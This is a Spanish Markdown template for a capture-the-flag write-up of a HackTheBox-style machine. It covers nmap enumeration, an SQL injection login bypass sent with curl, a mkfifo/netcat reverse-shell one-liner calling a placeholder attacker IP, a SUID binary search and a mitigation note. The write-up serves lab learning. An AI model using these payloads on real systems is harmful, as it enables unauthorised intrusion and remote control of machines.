---
title: "Máquina o Reto CTF"
slug: "plataforma-nombre-reto"
date: "2026-10-10"
platform: "HackTheBox" # HackTheBox | TryHackMe | PicoCTF | VulnHub | CTFtime
category: "Web / Pwn / Crypto / Forensics / Rev"
tags: ["sqli", "privesc", "linux", "cve-2024-xxxx", "sudo"]
difficulty: "Medio" # Fácil | Medio | Difícil | Insane
featured: false
summary: "Resumen conciso del vector de entrada inicial y la escalada de privilegios."
flag_user: "HTB{us3r_fl4g_h3r3}"
flag_root: "HTB{r00t_pwn3d_h3r3}"
---

# Máquina: Nombre del Reto

- **Plataforma:** HackTheBox / TryHackMe
- **Dificultad:** Media
- **SO:** Linux / Windows
- **Puntos clave:** Enumeración Web, SQL Injection, Escalada mediante binario SUID

---

## 1. Reconocimiento & Enumeración

Iniciamos con un escaneo exhaustivo de puertos mediante `nmap`:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.X -oN allPorts.txt
nmap -sCV -p 22,80 10.10.11.X -oN targeted.txt
```

### Hallazgos principales
- **Puerto 22 (SSH):** OpenSSH 8.9p1
- **Puerto 80 (HTTP):** Aplicación web en Python/Flask

---

## 2. Intrusión Inicial (User Flag)

Al revisar el endpoint de login descubrimos una vulnerabilidad:

```bash
curl -X POST http://10.10.11.X/login -d "user=admin' OR 1=1--&pass=x"
```

Obtenemos reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 4444 >/tmp/f
```

---

## 3. Escalada de Privilegios (Root Flag)

Comprobamos permisos `sudo -l` o binarios SUID:

```bash
find / -perm -4000 2>/dev/null
```

---

## 4. Flags & Resumen

- **User:** `HTB{...}`
- **Root:** `HTB{...}`
- **Mitigación recomendada:** Sanitización de parámetros de entrada con sentencias preparadas y ajuste de permisos de mínimos privilegios en sudoers.
